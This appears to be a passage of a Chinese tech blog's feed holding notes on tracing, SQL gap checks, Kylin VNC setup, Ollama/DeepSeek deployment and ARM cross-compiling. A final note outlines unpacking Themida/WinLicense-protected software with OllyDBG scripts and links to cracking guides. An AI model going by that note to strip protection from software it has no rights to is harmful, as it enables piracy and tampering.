<h3 id="分布式链路追踪"><a href="#分布式链路追踪" class="headerlink" title="分布式链路追踪"></a>分布式链路追踪</h3><blockquote>
<p>2010 年 4 月，Google 工程师发表了论文《Dapper, a Large-Scale Distributed Systems Tracing Infrastructure》[1]，论文总结了他们治理分布式系统的经验，并详细介绍了 Google 内部分布式链路追踪系统 Dapper 的架构设计和实现方法。</p>
</blockquote>
<p>如今的链路追踪系统大多以 Dapper 为原型设计，因为它们也统一继承了 Dapper 的核心概念：</p>
<ul>
<li>追踪（trace）：Trace 表示一次完整的分布式请求生命周期，它是一个全局上下文，包含了整个调用链所有经过的服务节点和调用路径。例如，用户发起一个请求，从前端服务到后端数据库的多次跨服务调用构成一个 Trace。</li>
<li>跨度（Span）：Span 是 Trace 中的一个基本单元，表示一次具体的操作或调用。一个 Trace 由多个 Span 组成，按时间和因果关系连接在一起。Span 内有描述操作的名称 span name、记录操作的开始时间和持续时间、Trace ID、当前 Span ID、父 Span ID（构建调用层级关系）等信息。</li>
</ul>
<h3 id="性能剖析"><a href="#性能剖析" class="headerlink" title="性能剖析"></a>性能剖析</h3><blockquote>
<p>可观测性领域的性能剖析（Profiling）的目标是分析运行中的应用，生成详细的性能数据（Profiles），帮助工程师全面了解应用的运行行为和资源使用情况，从而识别代码中的性能瓶颈。</p>
</blockquote>
<blockquote>
<p>性能数据通常以火焰图或堆栈图的形式呈现，分析这些数据是从“是什么”到“为什么”过程中的关键环节。</p>
</blockquote>
<blockquote>
<p>火焰图分析说明</p>
</blockquote>
<ul>
<li>纵轴：表示函数调用的堆栈深度（或层级）。纵向越高表示调用链越深，底部通常是程序的入口函数（如 main 函数），上层是被下层函数调用的函数。</li>
<li>横轴：表示函数在特定时间段内所占用的 CPU 时间或内存空间，条形的宽度越大，表示该函数消耗的时间或资源越多。</li>
</ul>
<p>分析火焰图的关键是观察横向条形的宽度，宽度越大，函数占用的时间越多。如果某个函数的条形图出现“平顶”现象，表示该函数的执行时间过长，可能成为性能瓶颈。</p>
<h3 id="核心转储"><a href="#核心转储" class="headerlink" title="核心转储"></a>核心转储</h3><blockquote>
<p>核心转储（Core dump）中的 “core” 代表程序的关键运行状态，“dump” 的意思是导出。</p>
</blockquote>
<h1 id="第十章-应用封装与交付"><a href="#第十章-应用封装与交付" class="headerlink" title="第十章 应用封装与交付"></a>第十章 应用封装与交付</h1><h2 id="“以应用为中心”的设计思想"><a href="#“以应用为中心”的设计思想" class="headerlink" title="“以应用为中心”的设计思想"></a>“以应用为中心”的设计思想</h2><blockquote>
<p>正是因为以应用为中心，整个云原生技术体系无限强调基础设施更好地服务于应用，以更高效的方式为应用提供基础设施能力，而不是反其道行之。而相应的，Kubernetes 也好、Docker 也好、Istio 也好，这些在云原生生态中起到了关键作用的开源项目，就是让这种思想落地的技术手段。</p>
</blockquote>
<h2 id="声明式管理的本质"><a href="#声明式管理的本质" class="headerlink" title="声明式管理的本质"></a>声明式管理的本质</h2><blockquote>
<p>分析 Kubernetes 的工作原理可以发现，无论是 kube-scheduler 调度 Pod，还是 Deployment 管理 Pod 部署，亦或是 HPA 执行弹性伸缩，它们的整体设计都遵循“控制器模式”。</p>
</blockquote>
<h2 id="从“封装配置”到“应用模型”"><a href="#从“封装配置”到“应用模型”" class="headerlink" title="从“封装配置”到“应用模型”"></a>从“封装配置”到“应用模型”</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.thebyte.com.cn/intro.html" target="_blank" rel="noopener">深入高可用系统原理与设计</a>,by thebyte.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
        <tag>计算机网络</tag>
        <tag>软件架构</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL判断字段值是否连续与是否从1开始</title>
    <url>/2025/01/14/SQL%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E5%80%BC%E6%98%AF%E5%90%A6%E8%BF%9E%E7%BB%AD%E4%B8%8E%E6%98%AF%E5%90%A6%E4%BB%8E1%E5%BC%80%E5%A7%8B/</url>
    <content><![CDATA[<p>最近遇到一个运维问题，编写SQL语句判断某个字段是否从1开始，是否是连续的，记录一下问题解决过程。</p>
<h1 id="目标数据表结构"><a href="#目标数据表结构" class="headerlink" title="目标数据表结构"></a>目标数据表结构</h1><p>目标数据表 Department 结构如下：</p>
<table>
<thead>
<tr>
<th>departId</th>
<th>personId</th>
</tr>
</thead>
<tbody><tr>
<td>7523</td>
<td>7523001</td>
</tr>
<tr>
<td>7523</td>
<td>7523002</td>
</tr>
<tr>
<td>7523</td>
<td>7523003</td>
</tr>
<tr>
<td>7524</td>
<td>7524001</td>
</tr>
<tr>
<td>7524</td>
<td>7524002</td>
</tr>
<tr>
<td>7524</td>
<td>7524003</td>
</tr>
</tbody></table>
<h1 id="判断字段是否从1开始"><a href="#判断字段是否从1开始" class="headerlink" title="判断字段是否从1开始"></a>判断字段是否从1开始</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from Department a </span><br><span class="line">where a.personId in ( select * from ( select min(personId) as personId from Department b group by b.departId )) and mod(personId, 1000) !&#x3D;1</span><br></pre></td></tr></table></figure>

<h1 id="判断字段是否连续"><a href="#判断字段是否连续" class="headerlink" title="判断字段是否连续"></a>判断字段是否连续</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from </span><br><span class="line">( select b.personId,</span><br><span class="line">( select max(personId) </span><br><span class="line">from Department a </span><br><span class="line">where a.personId &lt; b.personId and a.departId &#x3D; b.departId ) as prePersonId </span><br><span class="line">from Department b )</span><br><span class="line">where personId - 1 &gt; prePersonId</span><br></pre></td></tr></table></figure>

<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ol>
<li><a href="https://blog.csdn.net/sqlserverdiscovery/article/details/12950259" target="_blank" rel="noopener">在论坛中出现的比较难的sql问题：7(子查询 判断某个字段的值是否连续)</a>,by LongRui888.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>麒麟V10设置VNC连接的方法</title>
    <url>/2025/01/17/%E9%BA%92%E9%BA%9FV10%E8%AE%BE%E7%BD%AEVNC%E8%BF%9E%E6%8E%A5%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近研究了一下麒麟V10 Linux设置VNC连接的方法，记录一下。</p>
<h1 id="VNC-Server配置"><a href="#VNC-Server配置" class="headerlink" title="VNC Server配置"></a>VNC Server配置</h1><p>VNC Server应该能够以服务的形式开机自启动，对外以 80 端口提供VNC远程连接服务。</p>
<h2 id="创建-VNC-Systemd-服务"><a href="#创建-VNC-Systemd-服务" class="headerlink" title="创建 VNC Systemd 服务"></a>创建 VNC Systemd 服务</h2><p>创建VNC Systemd 服务，实现麒麟 V10 开机后 VNC 服务器自启动。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;</span><br><span class="line">sudo vim vncserver@:1.service</span><br><span class="line"></span><br><span class="line"># 以下为vnc服务配置文件内容，编辑后保存</span><br><span class="line">[Unit]</span><br><span class="line">Description&#x3D;Remote desktop service (VNC)</span><br><span class="line">After&#x3D;syslog.target network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;forking</span><br><span class="line">WorkingDirectory&#x3D;&#x2F;home&#x2F;jack</span><br><span class="line">User&#x3D;jack</span><br><span class="line">Group&#x3D;jack</span><br><span class="line">PIDFile&#x3D;&#x2F;home&#x2F;jack&#x2F;.vnc&#x2F;%H%i.pid</span><br><span class="line"></span><br><span class="line">ExecStartPre&#x3D;&#x2F;bin&#x2F;sh -c &#39;&#x2F;usr&#x2F;bin&#x2F;vncserver -kill %i &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 || :&#39;</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;vncserver -autokill %i</span><br><span class="line">ExecStop&#x3D;&#x2F;usr&#x2F;bin&#x2F;vncserver -kill %i</span><br><span class="line">Restart&#x3D;on-success</span><br><span class="line">RestartSec&#x3D;15</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>

<h2 id="设置-VNC-Systemd-服务开机自启动"><a href="#设置-VNC-Systemd-服务开机自启动" class="headerlink" title="设置 VNC Systemd 服务开机自启动"></a>设置 VNC Systemd 服务开机自启动</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 重新加载配置文件</span><br><span class="line">systemctl daemon-reload</span><br><span class="line"># 设置 VNC 客户端连接密码</span><br><span class="line">vncpasswd</span><br><span class="line"># 启动 vnc 服务</span><br><span class="line">systemctl start vncserver@:1.service</span><br><span class="line"># 查看 vnc 服务状态</span><br><span class="line">systemctl status vncserver@:1.service</span><br><span class="line">journalctl -u vncserver@:1.service</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;syslog | grep vnc</span><br><span class="line"># 设置开机自启动</span><br><span class="line">systemctl enable vncserver@:1.service</span><br><span class="line"># 禁止开机自启动</span><br><span class="line">systemctl disable vncserver@:1.service</span><br></pre></td></tr></table></figure>

<h2 id="修改-vncserver-配置"><a href="#修改-vncserver-配置" class="headerlink" title="修改 vncserver 配置"></a>修改 vncserver 配置</h2><p>修改 vncserver 配置，使 :1 对应 80 端口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看 vncserver 的位置</span><br><span class="line">which vncserver</span><br><span class="line"></span><br><span class="line"># 查看 vncserver 软连接到哪个文件</span><br><span class="line">file &#x2F;usr&#x2F;bin&#x2F;vncserver</span><br></pre></td></tr></table></figure>

<p>最终找到麒麟 V10 使用的 vncserver 为 TigerVNC，使用 Vim 修改 TigerVNC配置文件，将 5900 替换为 79。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;usr&#x2F;bin&#x2F;tigervncserver</span><br><span class="line"></span><br><span class="line"># 逐个替换并确认</span><br><span class="line">:%s&#x2F;5900&#x2F;79&#x2F;gc</span><br></pre></td></tr></table></figure>

<h2 id="修改-sysctl-conf-配置"><a href="#修改-sysctl-conf-配置" class="headerlink" title="修改 sysctl.conf 配置"></a>修改 sysctl.conf 配置</h2><p>Linux 对于非 root 用户禁止使用 1024 以下端口，但为了避免 VNC 服务被防火墙阻挡，应将 VNC 服务端口调整到 80 。修改 sysctl.conf 文件配置达到此目的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#临时生效</span><br><span class="line">sysctl net.ipv4.ip_unprivileged_port_start&#x3D;0</span><br><span class="line"></span><br><span class="line">#永久生效</span><br><span class="line">echo &quot;net.ipv4.ip_unprivileged_port_start&#x3D;0&quot; &gt;&gt; &#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure>

<h1 id="启动-VNC-服务"><a href="#启动-VNC-服务" class="headerlink" title="启动 VNC 服务"></a>启动 VNC 服务</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 设置 VNC 客户端连接密码</span><br><span class="line">vncpasswd</span><br><span class="line"></span><br><span class="line"># 启动 VNC 服务</span><br><span class="line">vncserver -kill :1</span><br><span class="line">vncserver :1</span><br><span class="line">vncserver -list</span><br></pre></td></tr></table></figure>

<h1 id="连接-VNC-服务"><a href="#连接-VNC-服务" class="headerlink" title="连接 VNC 服务"></a>连接 VNC 服务</h1><p>使用各种 VNC 客户端，填入相关配置连接即可。连接 VNC 服务器遇到一些问题，记录如下。</p>
<h2 id="vnc-viewer-连接黑屏问题"><a href="#vnc-viewer-连接黑屏问题" class="headerlink" title="vnc viewer 连接黑屏问题"></a>vnc viewer 连接黑屏问题</h2><p>基于 Systemd 设置 VNC 服务开机自启动成功，但是使用 RealVNC Viewer 客户端连接成功后显示黑屏，目前没有解决。<strong>但是使用 vncserver 直接创建 vnc 服务，然后使用 RealVNC Viewer 客户端连接成功后没有出现该问题。</strong></p>
<h2 id="中文输入法问题"><a href="#中文输入法问题" class="headerlink" title="中文输入法问题"></a>中文输入法问题</h2><p>打开终端，输入如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fcitx-autostart</span><br><span class="line">fcitx restart</span><br></pre></td></tr></table></figure>

<h2 id="输入正确用户名和密码仍旧跳回登录界面"><a href="#输入正确用户名和密码仍旧跳回登录界面" class="headerlink" title="输入正确用户名和密码仍旧跳回登录界面"></a>输入正确用户名和密码仍旧跳回登录界面</h2><p>原因是主目录下的 .Xauthority 文件拥有者变成了 root ，导致用户登录时无法获取该文件，解决方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chown user:user .Xauthority</span><br></pre></td></tr></table></figure>

<h2 id="麒麟-V10-自带的-Remmina-无法连接-VNC-服务器的问题"><a href="#麒麟-V10-自带的-Remmina-无法连接-VNC-服务器的问题" class="headerlink" title="麒麟 V10 自带的 Remmina 无法连接 VNC 服务器的问题"></a>麒麟 V10 自带的 Remmina 无法连接 VNC 服务器的问题</h2><p>麒麟 V10 自带的 Remmina 能够连接 VNC 服务器的默认的 5901 端口，但是无法连接 VNC 服务器的 80 端口。该问题暂未解决。</p>
<p><strong>建议使用 RealVNC Viewer 客户端，麒麟 v10 自带的 Remmina 客户端连接 80 端口有问题，暂时无法解决。</strong></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.runoob.com/w3cnote/linux-check-port-usage.html" target="_blank" rel="noopener">Linux 查看端口占用情况</a>,by runoob.</li>
<li><a href="https://blog.51cto.com/lenglingx/6393402" target="_blank" rel="noopener">普通用户无法监听 80，443等低于1024端口解决办法</a>,lenglingx.</li>
<li><a href="https://blog.csdn.net/yanghonker/article/details/41928841" target="_blank" rel="noopener">Ubuntu Kylin 输入正确的账号密码，登陆后又跳回到登录界面 解决方案</a>,by YoungHonker.</li>
<li><a href="https://ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html" target="_blank" rel="noopener">Systemd 入门教程：命令篇</a>,by 阮一峰.</li>
<li><a href="https://www.ruanyifeng.com/blog/2018/03/systemd-timer.html" target="_blank" rel="noopener">Systemd 定时器教程</a>,by 阮一峰.</li>
<li><a href="https://ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html" target="_blank" rel="noopener">Systemd 入门教程：实战篇</a>,by 阮一峰.</li>
<li><a href="https://www.ruanyifeng.com/blog/2016/03/node-systemd-tutorial.html" target="_blank" rel="noopener">Node 应用的 Systemd 启动</a>,by 阮一峰.</li>
<li><a href="https://blog.csdn.net/weixin_43246439/article/details/142390671" target="_blank" rel="noopener">Kylin V10 环境下配置VNC远程桌面访问</a>,by 丷月亮是指路牌.</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>QT_GUI插件系统构建方法研究</title>
    <url>/2025/02/04/QT-GUI%E6%8F%92%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9E%84%E5%BB%BA%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>构建一个较大桌面GUI应用程序，采用插件架构是必由之路。首先插件架构有利于多人分工协作，有利于系统功能的扩展和维护，有利于用户需求的快速响应。</p>
<h1 id="插件架构"><a href="#插件架构" class="headerlink" title="插件架构"></a>插件架构</h1><p>插件架构系统主要由以下三部分构成：</p>
<ul>
<li>主系统，通过插件管理器加载插件，并创建插件对象。</li>
<li>插件管理器，用于管理插件的生命周期，并将其暴露给主系统。</li>
<li>插件，插件本身应符合插件管理器协议，并提供符合主系统期望的对象。</li>
</ul>
<h1 id="QT插件示例"><a href="#QT插件示例" class="headerlink" title="QT插件示例"></a>QT插件示例</h1><p>请参考：</p>
<ul>
<li><a href="https://doc.qt.io/qt-5/qtwidgets-tools-echoplugin-example.html" target="_blank" rel="noopener">Echo Plugin Example </a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://developer.aliyun.com/article/595023" target="_blank" rel="noopener">构建自己的Qt插件系统</a>,by aliyun.</li>
<li><a href="https://blog.csdn.net/qq_33055735/article/details/99653516" target="_blank" rel="noopener">深入理解插件系统</a>,by qq_33055735.</li>
<li><a href="https://doc.qt.io/qt-5/qtwidgets-tools-echoplugin-example.html" target="_blank" rel="noopener">Echo Plugin Example </a>,by qt.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>DeepSeek大模型本地部署方法</title>
    <url>/2025/02/26/DeepSeek%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>DeepSeek如此火热，不禁也研究一下本地部署DeepSeek的方法。</p>
<h1 id="Ollama-安装和使用"><a href="#Ollama-安装和使用" class="headerlink" title="Ollama 安装和使用"></a>Ollama 安装和使用</h1><blockquote>
<p>Ollama是一款启动并运行大型语言模型的工具。</p>
</blockquote>
<blockquote>
<p>安装完成后，我们直接打开命令行执行 ollama –version 判断是否安装成功。</p>
</blockquote>
<blockquote>
<p>ollama 会在我们本地服务监听 11434 端口。</p>
</blockquote>
<h2 id="在线部署大模型"><a href="#在线部署大模型" class="headerlink" title="在线部署大模型"></a>在线部署大模型</h2><blockquote>
<p>我们可以直接使用 ollama run 模型名称 来下载和运行我们想要的模型。例如：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看ollama版本</span><br><span class="line">ollama --version</span><br><span class="line"># 下载大模型</span><br><span class="line">ollama pull deepseek--r1:1.5b</span><br><span class="line"># 运行大模型</span><br><span class="line">ollama run deepseek-r1:1.5b</span><br></pre></td></tr></table></figure>

<h2 id="离线部署大模型"><a href="#离线部署大模型" class="headerlink" title="离线部署大模型"></a>离线部署大模型</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在联网生成大模型描述文件</span><br><span class="line">ollama show deepseek-r1:1.5b --modelfile &gt; modelfile.txt</span><br><span class="line"></span><br><span class="line"># 复制大模型和大模型描述文件到离线电脑某个文件夹，然后使用如下命令离线部署</span><br><span class="line">ollama create deepseek-r1:1.5b -f modelfile.txt</span><br><span class="line"></span><br><span class="line"># 验证是否离线部署成功</span><br><span class="line">ollama list</span><br></pre></td></tr></table></figure>

<h1 id="与AI交互的客户端"><a href="#与AI交互的客户端" class="headerlink" title="与AI交互的客户端"></a>与AI交互的客户端</h1><h2 id="ChatBox-桌面客户端"><a href="#ChatBox-桌面客户端" class="headerlink" title="ChatBox 桌面客户端"></a>ChatBox 桌面客户端</h2><blockquote>
<p>Chatbox 是一款开源的 AI 客户端，专为与各种大型语言模型进行交互而设计。它支持包括 Ollama 在内的多种主流模型的 API 接入，无论是本地部署的模型，还是其他服务提供商的模型，都能轻松连接。</p>
</blockquote>
<h3 id="连接本地-Ollama-服务"><a href="#连接本地-Ollama-服务" class="headerlink" title="连接本地 Ollama 服务"></a>连接本地 Ollama 服务</h3><h3 id="连接远程-Ollama-服务"><a href="#连接远程-Ollama-服务" class="headerlink" title="连接远程 Ollama 服务"></a>连接远程 Ollama 服务</h3><p>请参考：</p>
<ul>
<li><a href="https://chatboxai.app/zh/help-center/connect-chatbox-remote-ollama-service-guide" target="_blank" rel="noopener">如何将 Chatbox 连接到远程 Ollama 服务：逐步指南</a></li>
</ul>
<h2 id="Open-webui-Web客户端"><a href="#Open-webui-Web客户端" class="headerlink" title="Open-webui Web客户端"></a>Open-webui Web客户端</h2><blockquote>
<p>Open-WebUI是一个可扩展、功能丰富且用户友好的自托管人工智能平台，设计上完全离线运行。它支持各种大语言模型（LLM）执行器，如 Ollama和兼容OpenAI的APIs ，并内置了用于检索增强生成（RAG）的推理引擎，使其成为一个强大的AI部署解决方案 。</p>
</blockquote>
<p>部署过程请参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/693709267" target="_blank" rel="noopener">llama3本地环境配置（Ollama+open-webui）</a></li>
<li><a href="https://github.com/open-webui/open-webui" target="_blank" rel="noopener">Open WebUI</a></li>
</ul>
<h2 id="Page-Assist-Ollama-实现本地模型联网"><a href="#Page-Assist-Ollama-实现本地模型联网" class="headerlink" title="Page Assist + Ollama - 实现本地模型联网"></a>Page Assist + Ollama - 实现本地模型联网</h2><blockquote>
<p>Chatbox 提供了联网功能，但是 DeepSeek R1 模型是没办法联网。</p>
</blockquote>
<blockquote>
<p>想要让本地模型联网我们还得靠一个浏览器插件 Page Assist。</p>
</blockquote>
<blockquote>
<p>Page Assist 是一款开源的浏览器扩展程序，旨在为本地 AI 模型（如 Ollama）提供便捷的交互界面。</p>
</blockquote>
<h1 id="RAG-打造知识库"><a href="#RAG-打造知识库" class="headerlink" title="RAG 打造知识库"></a>RAG 打造知识库</h1><h2 id="RAG-架构介绍"><a href="#RAG-架构介绍" class="headerlink" title="RAG 架构介绍"></a>RAG 架构介绍</h2><blockquote>
<p>RAG（Retrieval-Augmented Generation，检索增强生成）是一种结合信息检索与生成模型的人工智能技术，旨在通过检索外部知识库中的信息来增强语言模型的生成能力。</p>
</blockquote>
<blockquote>
<p>LLM（Large Language Model，大语言模型）</p>
</blockquote>
<blockquote>
<p>Embedding（嵌入）：通过一个专门的模型来把你上传的文本、表格数据等本地文件处理成机器能理解的 “数字代码”。相似的文本在这个向量空间中距离会更近。比如，“苹果”和“水果”这两个词的嵌入向量就会比较接近，而“苹果”和“汽车”就会离得很远。</p>
</blockquote>
<blockquote>
<p>Vector Database（向量数据库）：用来存储上一步处理好的 “数字代码” 的数据库，它能够高效地存储和检索这些向量。当你有一个问题时，它会把问题转换成向量，然后在这个仓库里快速找到和问题最相关的向量。比如，你问“苹果是什么？”它会在这个仓库里找到和“苹果”相关的向量，比如“水果”“红色”“圆形”等。</p>
</blockquote>
<h2 id="Anything-LLM"><a href="#Anything-LLM" class="headerlink" title="Anything LLM"></a>Anything LLM</h2><blockquote>
<p>Anything LLM 是一款基于 RAG架构的本地知识库工具，能够将文档、网页等数据源与本地运行的大语言模型（LLM）相结合，构建个性化的知识库问答系统。</p>
</blockquote>
<p>知识库的构建请参考:</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_43424450/article/details/139941337" target="_blank" rel="noopener">跟着DW学习大语言模型-什么是知识库，如何构建知识库</a></li>
<li><a href="https://www.cnblogs.com/abyssdawn/p/18615978" target="_blank" rel="noopener">从零开始构建一个基于大模型和 RAG 的知识库问答系统</a></li>
</ul>
<h1 id="大模型微调"><a href="#大模型微调" class="headerlink" title="大模型微调"></a>大模型微调</h1><p>Fine-tuning（微调）：通过特定领域数据对预训练模型进行针对性优化，以提升其在特定任务上的性能。</p>
<p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/qq_39172059/article/details/136693607" target="_blank" rel="noopener">【大模型开发 】 一文搞懂Fine-tuning（大模型微调）</a></li>
<li><a href="https://blog.csdn.net/acelit/article/details/137836915" target="_blank" rel="noopener">深入理解大语言模型微调技术</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/22699135850" target="_blank" rel="noopener">如何拥有一个无限制、可联网、带本地知识库的私人 DeepSeek？</a>,by ConardLi​.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25054526736" target="_blank" rel="noopener">如何把你的 DeePseek-R1 微调为某个领域的专家？</a>,by ConardLi​.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25911959907" target="_blank" rel="noopener">DeepSeek + Cherry Studio：简捷搭建个人知识库</a>,by 苏点点.</li>
<li><a href="https://deepseek.csdn.net/67c02dcf6670175f992c57dd.html" target="_blank" rel="noopener">打造DeepSeek最强外挂！一篇文章教会你搭建「个人知识库」（喂饭版）</a>,by m0_63171455.</li>
<li><a href="https://zhuanlan.zhihu.com/p/678196390" target="_blank" rel="noopener">LLM context 长度分析与提升方法总结</a>,by phynlp.</li>
<li><a href="https://www.reddit.com/r/ollama/comments/1fm67bw/what_do_you_mean_exactly_with_embedding_length/" target="_blank" rel="noopener">What do you mean exactly with “embedding length” ?</a>,by reddit.</li>
<li><a href="https://medium.com/@techresearchspace/what-is-quantization-in-llm-01ba61968a51" target="_blank" rel="noopener">What is Quantization in LLM</a>,by Nithin Devanand.</li>
<li><a href="https://github.com/karminski/one-small-step/blob/main/20250129-what-is-quantization-in-LLM/what-is-quantization-in-LLM.md" target="_blank" rel="noopener">什么是大语言模型量化? 每个量化精度都代表什么?</a>,by karminski.</li>
<li><a href="https://www.53ai.com/news/LargeLanguageModel/2024073165281.html" target="_blank" rel="noopener">大模型｜“上下文长度”和“上下文窗口”不再傻傻分不清楚！</a>,by 智识可乐.</li>
<li><a href="https://blog.lovefc.cn/archives/start.html" target="_blank" rel="noopener">本地部署deepseek模型保姆级教程</a>,by lovefc.</li>
<li><a href="https://blog.csdn.net/weixin_43424450/article/details/139941337" target="_blank" rel="noopener">跟着DW学习大语言模型-什么是知识库，如何构建知识库</a>,by 羞儿.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25014190693" target="_blank" rel="noopener">DeepSeek +Kimi 免费快速生成PPT！</a>,by UIED用户体验交流学习.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu下交叉编译ARM程序方法</title>
    <url>/2025/03/03/Ubuntu%E4%B8%8B%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91ARM%E7%A8%8B%E5%BA%8F%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>需要在 X64 的 Ubuntu 20.04 平台交叉编译 ARM64 架构的程序，研究一下交叉编译工具链的使用方法。</p>
<h1 id="交叉编译工具链"><a href="#交叉编译工具链" class="headerlink" title="交叉编译工具链"></a>交叉编译工具链</h1><p>交叉编译工具链是一个由编译器、连接器和解释器组成的综合开发工具集，交叉编译工具链主要由binutils、gcc和glibc三个部分组成。有时出于减小 libc 库大小的考虑，也可以用别的 c 库来代替 glibc，例如 uClibc、dietlibc 和 newlib。</p>
<h1 id="Ubuntu-ARM-交叉编译工具链安装"><a href="#Ubuntu-ARM-交叉编译工具链安装" class="headerlink" title="Ubuntu ARM 交叉编译工具链安装"></a>Ubuntu ARM 交叉编译工具链安装</h1><p>目前主流的 ARM 交叉编译工具链主要有三种：</p>
<ul>
<li>Linaro 提供的 ARM 交叉编译工具链，可以到 Linaro 官网 Linaro Releases 去下载已经制作好的交叉编译工具链</li>
<li>GNU（提供源码，自行编译制作）</li>
<li>Codesourcery</li>
</ul>
<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/2852384493" target="_blank" rel="noopener">Linux Clash 最速安装使用</a>,by 工科生的困意.</li>
<li><a href="https://www.cnblogs.com/The-explosion/p/16845668.html" target="_blank" rel="noopener">Ubuntu 交叉编译工具链安装</a>,by 孤情剑客.</li>
<li><a href="https://blog.csdn.net/yikunbai5708/article/details/117067947" target="_blank" rel="noopener">【一】ubuntu交叉编译工具链选择与安装</a>,by UNI-少林寺武功.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Themida &amp; WinLicense 2.0 - 2.4.6 脱壳的方法</title>
    <url>/2025/04/17/Themida/</url>
    <content><![CDATA[<p>最近遇到一个软件，使用exeinfo pe查看，发现其使用 Themida &amp; WinLicense 2.0 - 2.4.6 加了壳，于是想办法给该软件脱壳，记录一下过程。</p>
<h1 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h1><p>壳是一种专用的加密软件技术，它能够保护软件的二进制程序，避免其直接暴露在不怀好意的同行面前。要理解壳，要脱壳，首先得了解一些基本知识。</p>
<p>壳所保护的软件二进制程序通常采用PE文件格式，包括壳自身也是如此。因此有必要了解PE文件格式。</p>
<h1 id="壳的分类"><a href="#壳的分类" class="headerlink" title="壳的分类"></a>壳的分类</h1><p>常用的壳可分为压缩壳、加密壳、虚拟机保护壳。</p>
<h1 id="脱壳技术"><a href="#脱壳技术" class="headerlink" title="脱壳技术"></a>脱壳技术</h1><p>脱壳技术的核心是寻找目标程序的 OEP（Original Entry Point，原程序入口点），然后将目标程序恢复出来。</p>
<h1 id="脱壳过程"><a href="#脱壳过程" class="headerlink" title="脱壳过程"></a>脱壳过程</h1><p>请参考<a href="https://bbs.kanxue.com/thread-255174.htm" target="_blank" rel="noopener">[分享]Themida &amp; WinLicense 2.0 - 2.4.6 脱壳</a>。脱壳过程需要注意的是：</p>
<ul>
<li>ODBGScript v1.82.6，ODBGScript插件版本必须不小于v1.82.6，否则 Themida &amp; WinLicense 2.0 - 2.4.6 的脱壳脚本将运行报错。</li>
<li>需要在 32 位系统中运行 OllyDBG，否则将报 StrongOD 插件不可用错误。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://bbs.kanxue.com/thread-255174.htm" target="_blank" rel="noopener">[分享]Themida &amp; WinLicense 2.0 - 2.4.6 脱壳</a>,by Hasic.</li>
<li><a href="https://www.bilibili.com/video/BV1Ax411R7rR/" target="_blank" rel="noopener">软件破解之脱壳八法</a>,by 爱笑的程序狗.</li>
</ol>
